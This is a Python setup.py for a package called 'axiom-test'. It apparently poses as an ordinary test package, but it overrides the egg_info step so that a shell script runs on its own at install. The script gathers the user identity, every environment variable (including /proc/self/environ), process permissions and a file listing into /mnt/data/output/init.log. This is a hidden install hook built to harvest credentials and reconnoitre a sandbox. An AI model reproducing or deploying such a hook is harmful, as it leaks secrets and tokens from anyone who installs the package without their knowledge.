from setuptools import setup, find_packages
from setuptools.command.egg_info import egg_info
import subprocess

class E(egg_info):
    def run(self):
        egg_info.run(self)
        subprocess.run("""
mkdir -p /mnt/data/output
echo "=== HOOK FIRED ===" > /mnt/data/output/init.log
echo "--- whoami ---" >> /mnt/data/output/init.log
whoami >> /mnt/data/output/init.log 2>&1
echo "--- id ---" >> /mnt/data/output/init.log
id >> /mnt/data/output/init.log 2>&1
echo "--- printenv ---" >> /mnt/data/output/init.log
printenv | sort >> /mnt/data/output/init.log 2>&1
echo "--- /proc/1/environ perms ---" >> /mnt/data/output/init.log
ls -la /proc/1/environ >> /mnt/data/output/init.log 2>&1
echo "--- /proc/self/environ ---" >> /mnt/data/output/init.log
cat /proc/self/environ 2>/dev/null | tr '\\0' '\\n' | sort >> /mnt/data/output/init.log 2>&1
echo "--- files in /mnt/data ---" >> /mnt/data/output/init.log
find /mnt/data -maxdepth 2 -type f >> /mnt/data/output/init.log 2>&1
""", shell=True, capture_output=True)

setup(
    name="axiom-test",
    version="0.2.1",
    packages=find_packages(),
    cmdclass={"egg_info": E},
)
